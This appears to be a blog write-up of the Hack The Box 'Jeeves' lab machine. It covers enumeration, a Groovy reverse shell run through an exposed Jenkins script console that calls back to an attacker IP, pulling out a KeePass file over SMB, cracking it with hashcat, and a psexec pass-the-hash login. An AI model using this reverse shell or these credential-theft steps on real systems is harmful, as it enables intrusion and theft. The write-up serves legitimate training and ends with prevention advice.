@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en" class="dark-theme">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Detailed write-up of the Jeeves machine from Hack The Box.">
+    <meta property="og:title" content="HTB Jeeves write-up">
+    <meta property="og:description" content="Detailed write-up of the Jeeves machine from Hack The Box">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bb4go.github.io/writeups/jeeves.html">
+    <link rel="canonical" href="https://bb4go.github.io/writeups/jeeves.html">
+    <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+    <link rel="stylesheet" href="../css/style.css">
+    <title>HTB Jeeves Walkthrough - b4go</title>
+</head>
+<body>
+    <header>
+        <div class="header-content container">
+            <div class="logo">
+                <a href="../index.html">b4go</a>
+            </div>
+            <nav class="main-nav">
+                <button class="mobile-menu-toggle" aria-label="Toggle menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+                <ul class="nav-list">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="../projects.html">Projects</a></li>
+                    <li class="active"><a href="../writeups.html">Write-ups</a></li>
+                    <li><a href="../about.html">About Me</a></li>
+                    <li>
+                        <button class="theme-toggle" aria-label="Toggle theme">
+                            <svg class="sun-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+                            <svg class="moon-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+                        </button>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <article class="content-with-nav">
+            <div class="container">
+                <div class="article-header">
+                    <h1>Jeeves</h1>
+                    <div class="meta">
+                        <span class="date">Published: Apr 16, 2025</span>
+                        <div class="tags">
+                            <span class="tag">#htb</span>
+                                <span class="tag">#oscp</span>
+                                <span class="tag">#windows</span>
+                                <span class="tag">#medium</span>
+                                <span class="tag">#jenkins</span>
+                        </div>
+                    </div>
+                </div>
+                <div id="reading-time" class="reading-time"></div>
+
+              
+                  
+
+                  
+                   
+                <div class="content-layout">
+                    <div class="main-content">
+                        <section id="introduction" class="content-section">
+                            <h2>Introduction</h2>
+                            <br>
+                            <p>Jeeves is a medium Windows box that focuses on web exploitation and privilege escalation using alternative paths. It’s a straightforward machine but introduces some uncommon techniques.</p>
+                            
+                            
+                        </section>
+
+                        <section id="recon" class="content-section">
+                            <h2>Recon</h2>
+                            <h3>Initial Port Scan</h3>
+                            <p>I started by conducting a port scan using Nmap to identify open ports and services running on the target:</p>
+                            
+                            <div class="code-block">
+                                <button class="copy-btn">📋 Copy</button>
+                                <pre><code>b4go@parrot-~/HTB/Jeeves $ nmap -sCV -p- --open -oA jeeves 10.10.10.63
+                                    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-16 09:32 CEST
+                                    Nmap scan report for 10.10.10.63
+                                    Host is up (0.051s latency).
+                                    Not shown: 65531 filtered tcp ports (no-response)
+                                    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+                                    PORT      STATE SERVICE      VERSION
+                                    80/tcp    open  http         Microsoft IIS httpd 10.0
+                                    |_http-title: Ask Jeeves
+                                    |_http-server-header: Microsoft-IIS/10.0
+                                    | http-methods: 
+                                    |_  Potentially risky methods: TRACE
+                                    135/tcp   open  msrpc        Microsoft Windows RPC
+                                    445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+                                    50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+                                    |_http-server-header: Jetty(9.4.z-SNAPSHOT)
+                                    |_http-title: Error 404 Not Found
+                                    Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+                                    
+                                    Host script results:
+                                    |_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m57s
+                                    | smb2-time: 
+                                    |   date: 2025-04-16T12:34:48
+                                    |_  start_date: 2025-04-16T12:26:02
+                                    | smb2-security-mode: 
+                                    |   3:1:1: 
+                                    |_    Message signing enabled but not required
+                                    | smb-security-mode: 
+                                    |   account_used: guest
+                                    |   authentication_level: user
+                                    |   challenge_response: supported
+                                    |_  message_signing: disabled (dangerous, but default)
+                                    
+                                    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+                                    Nmap done: 1 IP address (1 host up) scanned in 153.02 seconds
+                                    </code></pre>
+                              </div>
+                        </section>
+                              <section id="enumeration" class="content-section">
+                                <h2>Enumeration</h2>
+                            <h3>Service Enumeration</h3>
+                            <p>Let's check port by port what we can find...</p>
+                            
+                            <h4>Port 80</h4>
+                            <p> It's a simple web page with an input text field: </p>
+                           <img src="../boximages/jeeves/1.png">
+                                <br>
+                           <p>I checked a bit but couldn't find a way in, anything we type we only get an error so I decide to move forward.</p>
+                           
+                           <img src="../boximages/jeeves/2.png">
+                                <br>
+                           <h4>Port 135</h4>
+                           <p>We have no credentials so I try to enumerate with a null session</p>
+
+                           <div class="code-block">
+                           <button class="copy-btn">📋 Copy</button>
+                           <pre><code>b4go@parrot-~/HTB/Jeeves $ rpcclient -U '' -N 10.10.10.63
+                            Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+                               </code></pre>
+                         </div>
+                        <h4>Port 445</h4>
+                        <p>I try null session again or a guest:guest but is not valid, I try to enumerate vulnerabilities with nmap but still nothing to be found here.</p>
+
+                        <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>b4go@parrot-~/HTB/Jeeves $ smbmap -H 10.10.10.63
+                                [!] Authentication error on 10.10.10.63
+                                </code></pre>
+                          </div>
+                          <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>b4go@parrot-~/HTB/Jeeves $ smbmap -H 10.10.10.63 -u guest -p guest 
+                                [!] Authentication error on 10.10.10.63
+                                </code></pre>
+                          </div>
+
+                        
+                          <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>b4go@parrot-~/HTB/Jeeves $ nmap --min-rate 5000 -p139,445 --script smb-vuln* 10.10.10.63 -Pn
+                                Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-16 11:21 CEST
+                                Nmap scan report for jeeves.htb (10.10.10.63)
+                                Host is up (0.076s latency).
+                                
+                                PORT    STATE    SERVICE
+                                139/tcp filtered netbios-ssn
+                                445/tcp open     microsoft-ds
+                                
+                                Host script results:
+                                |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+                                |_smb-vuln-ms10-054: false
+                                Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
+                                </code></pre>
+                          </div>
+
+                          <h4>Port 50000</h4>
+                          <p>We get to this page which does give relevant information, the link get us to the jetty official page so we can only fuzz and expect to find something.</p>
+                          <img src="../boximages/jeeves/3.png">
+                          <br>
+                        <h4>Fuzzing </h4>
+                          <p>I start by enumerating port 80 and see to check for exposed directories here there is  anything.</p>
+
+                            <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.63/FUZZ
+                         :: Method           : GET
+                         :: URL              : http://10.10.10.63/FUZZ
+                         :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+                         :: Follow redirects : false
+                         :: Calibration      : false
+                         :: Timeout          : 10
+                         :: Threads          : 40
+                         :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+                        ________________________________________________
+                        
+                        #                       [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 173ms]
+                                                [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 173ms]
+                        #                       [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 174ms]
+                        # This work is licensed under the Creative Commons [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 173ms]
+                        # Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 173ms]
+                        #                       [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 174ms]
+                        # license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 174ms]
+                        # or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 174ms]
+                        # Copyright 2007 James Fisher [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 174ms]
+                        # on at least 3 different hosts [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 174ms]
+                        # Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 176ms]
+                        # directory-list-2.3-small.txt [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 184ms]
+                        # Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 192ms]
+                        #                       [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 204ms]
+                                                [Status: 200, Size: 503, Words: 38, Lines: 17, Duration: 47ms]
+                        :: Progress: [87664/87664] :: Job [1/1] :: 735 req/sec :: Duration: [0:01:52] :: Errors: 0 ::
+                                </code></pre>
+                          </div>
+
+                          <p>Let's move on to port 50000</p>
+                          <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.63:50000/FUZZ 
+                         :: Method           : GET
+                         :: URL              : http://10.10.10.63:50000/FUZZ
+                         :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+                         :: Follow redirects : false
+                         :: Calibration      : false
+                         :: Timeout          : 10
+                         :: Threads          : 40
+                         :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+                        ________________________________________________
+                        
+                        askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 71ms]
+                        :: Progress: [87664/87664] :: Job [1/1] :: 813 req/sec :: Duration: [0:01:52] :: Errors: 0 ::
+                        ```
+                                </code></pre>
+                          </div>
+
+                          <p>We find the /askjeeves directory: </p>
+                          <img src="../boximages/jeeves/4.png">
+                              </section>
+                              <section id="exploitation" class="content-section">
+                                <h2>Exploitation</h2>
+                          <p>We spot the jenkins version (2.87) which is outdated, current version for jenkins right now is 2.506, there maybe vulnerabilities but let's look around.
+
+                            If we go to build executor status we see the machine running the jenkins </p>
+
+                            <img src="../boximages/jeeves/5.png">
+
+                            <p>We see a node (master) as Windows 10 which is available to take jobs, let's move forward and click on master.</p>
+                            <img src="../boximages/jeeves/6.png">
+                            <p>Left side we have a script console: </p>
+                            <img src="../boximages/jeeves/7.png">
+                            <p>This script console let us run groovy scripts that execute directly in the server, this way we can get a reverse shell by setting up a listener and executing the script: </p>
+                            <code>
+                                String host = "10.10.14.2";
+                                int port = 443;
+                                String cmd = "cmd.exe";
+                                Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+                                Socket s = new Socket(host, port);
+                                InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+                                OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+                                while (!s.isClosed()) {
+                                    while (pi.available() > 0) so.write(pi.read());
+                                    while (pe.available() > 0) so.write(pe.read());
+                                    while (si.available() > 0) po.write(si.read());
+                                    so.flush();
+                                    po.flush();
+                                    Thread.sleep(50);
+                                    try {
+                                        p.exitValue();
+                                        break;
+                                    } catch (Exception e) {}
+                                }
+                                p.destroy();
+                                s.close();
+                            </code>
+                                <br>
+                                <br>
+                                
+                                <img src="../boximages/jeeves/8.png">
+                        <p>simply change the host and port parameters and hit run in the script console while a listener is on</p>
+                        <img src="../boximages/jeeves/9.png">
+                        <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                                <pre><code>b4go@parrot-~ $ sudo rlwrap nc -lvnp 443
+                                    [sudo] password for b4go: 
+                                    listening on [any] 443 ...
+                                    connect to [10.10.14.2] from (UNKNOWN) [10.10.10.63] 49876
+                                    icrosoft Windows [Version 10.0.10586]
+                                    (c) 2015 Microsoft Corporation. All rights reserved.
+                                    
+                                    C:\Users\Administrator\.jenkins></code></pre>
+                          
+                        </div>
+                        <p>we get in as user kohsuke and get the flag:</p>
+                        <img src="../boximages/jeeves/11a.png">
+                              </section>
+                              <section id="privilege-escalation" class="content-section">
+                                <h2>Privilege escalation</h2>
+
+                    
+                        <p>First commands first, I try whoami /priv to get a list of privileges available:</p>
+                        <img src="../boximages/jeeves/10.png">
+                        <p>I tried to elevate with godpotato/printspoofer without luck so next step is to enumerate some folders, I always start with home directories, downloads, documents, desktop...</p>
+                        <p>In the documents folder and find a .kdbx file that can be useful, I will download it to my machine.</p>
+                        <img src="../boximages/jeeves/13.png">
+                        <p>We create a shared folder with </p>
+
+                        <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>b4go@parrot-~/HTB/Jeeves $ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+                                Impacket v0.11.0 - Copyright 2023 Fortra
+                                
+                                [*] Config file parsed
+                                [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+                                [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+                                [*] Config file parsed
+                                [*] Config file parsed
+                                [*] Config file parsed
+                                 </code></pre>
+                          </div>
+                          <p>in the windows machine:</p>
+                       
+                          <img src="../boximages/jeeves/14.png">
+                          <img src="../boximages/jeeves/15.png">
+
+                          
+                    
+                          <p>We try to open it with keepassxc but it is password protected, as expected:</p>
+                          <img src="../boximages/jeeves/16.png">
+                          <br>
+                          <p>With keepass2john we extract the hash and try to crack it </p>
+                          <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>b4go@parrot-~/HTB/Jeeves $ /home/b4go/john/run/keepass2john /tmp/smbshare/CEH.kdbx > keepass.hash
+                                 </code></pre>
+                          </div>
+
+                        
+                          <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>b4go@parrot-~/HTB/Jeeves $ ls
+                                50438.txt  jeeves.gnmap  jeeves.nmap  jeeves.xml  keepass.hash
+                                 </code></pre>
+                          </div>
+
+                          <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>b4go@parrot-~/HTB/Jeeves $ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt  --show
+                                $keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
+                                
+                                 </code></pre>
+                          </div>
+                        <p>The password is moonshine1</p>
+                        <p>Finally we find the administrator hash in the keepass file and login</p>
+                        
+                        <img src="../boximages/jeeves/17.png">
+
+                        <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>b4go@parrot-~/HTB/Jeeves $ impacket-psexec administrator@10.10.10.63 -hashes (...)
+                                Impacket v0.11.0 - Copyright 2023 Fortra
+                                
+                                [*] Requesting shares on 10.10.10.63.....
+                                [*] Found writable share ADMIN$
+                                [*] Uploading file KPsEmkvD.exe
+                                [*] Opening SVCManager on 10.10.10.63.....
+                                [*] Creating service YokO on 10.10.10.63.....
+                                [*] Starting service YokO.....
+                                [!] Press help for extra shell commands
+                                Microsoft Windows [Version 10.0.10586]
+                                (c) 2015 Microsoft Corporation. All rights reserved.
+                                 </code></pre>
+                          </div>
+                          
+                          <p>flag is not in desktop, we look deeper</p>
+                          <img src="../boximages/jeeves/18.png">
+                          <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>
+                          C:\Users\Administrator\Desktop> dir /R
+                          Volume in drive C has no label.
+                          Volume Serial Number is 71A1-6FA1
+                          
+                          Directory of C:\Users\Administrator\Desktop
+                          
+                          11/08/2017  10:05 AM    <DIR>          .
+                          11/08/2017  10:05 AM    <DIR>          ..
+                          12/24/2017  03:51 AM                36 hm.txt
+                                                         34 hm.txt:root.txt:$DATA
+                          11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+                                         2 File(s)            833 bytes
+                                         2 Dir(s)   2,604,093,440 bytes free
+                            </code></pre>
+                          </div>
+                          
+                          <div class="code-block">
+                            <button class="copy-btn">📋 Copy</button>
+                            <pre><code>
+                          C:\Users\Administrator\Desktop> more < hm.txt:root.txt
+                          afbc5bd4******
+                            </code></pre>
+                          </div>
+
+                            <p><code>dir /R</code> command will show us  the **alternate data streams (ADS)** of files, it is like hidden parts of a file that don’t show up in a normal `dir` listing. Good to have in mind whenever we look for something we expect to be somewhere.</p>
+                            </section>
+                            <section id="conclusion" class="content-section">
+                                <h2>Conclusion</h2>
+                                <p>Jeeves showed how an exposed Jenkins instance, combined with weak internal controls, can lead to a full domain compromise. What started as basic web fuzzing turned into code execution through the script console, and from there, poor credential hygiene handed over the keys. It’s a good reminder that internal tooling can pose just as much risk as public-facing apps if not properly secured.
+
+                                </p>
+                                <h3>Prevention:</h3>
+                                <ul>
+                                    <li>Restrict access to the script console and tie it to role-based permissions </li>
+                                    <li>Regularly audit and rotate credentials stored in password managers.</li>
+                                    <li>Enforce least privilege across user accounts and services</li>
+                               
+                                </ul>
+                                
+                            </section>
+                       
+                    </div>
+
+                    <aside class="content-nav">
+                        <nav class="scrollspy-nav">
+                            <ul>
+                                <li><a href="#introduction" class="active">Introduction</a></li>
+                                <li><a href="#recon">Recon</a></li>
+                                <li><a href="#enumeration">Enumeration</a></li>
+                                <li><a href="#exploitation">Exploitation</a></li>
+                                <li><a href="#privilege-escalation">Priv-esc</a></li>
+                                <li><a href="#conclusion">Conclusion</a></li>
+                            </ul>
+                        </nav>
+                    </aside>
+                </div>
+            </div>
+        </article>
+    </main>
+
+    <button id="back-to-top" aria-label="Back to top">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
+    </button>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="social-links">
+                    <a href="https://github.com/bb4go/" aria-label="GitHub">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
+                    </a>
+                    </a>
+                    <a href="rss.xml" aria-label="RSS Feed">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg>
+                    </a>
+                    <a href="mailto:b4go@protonmail.com" aria-label="mail">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
+                        viewBox="0 0 24 24" fill="none" stroke="currentColor" 
+                        stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="5" width="18" height="14" rx="2" ry="2"></rect>
+                        <polyline points="3 7 12 13 21 7"></polyline>
+                        </svg>
+                    </a>
+                    <a href="https://buymeacoffee.com/b4go" aria-label="Buy Me a Coffee" target="_blank" rel="noopener">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
+                             viewBox="0 0 24 24" fill="none" stroke="currentColor" 
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                          <path d="M18 8h1a4 4 0 0 1 0 8h-1" />
+                          <path d="M2 8h16v5a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4Z" />
+                          <line x1="6" y1="2" x2="6" y2="4" />
+                          <line x1="10" y1="2" x2="10" y2="4" />
+                          <line x1="14" y1="2" x2="14" y2="4" />
+                        </svg>
+                      </a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+
+    <script src="../js/theme.js"></script>
+    <script src="../js/scrollspy.js"></script>
+    <script src="../js/main.js"></script>
+    <script src="../js/adventure-mode.js"></script>
+    <script src="../js/read.js"></script>
+    <script src="../js/copy.js"></script>
+
+</body>
+</html>
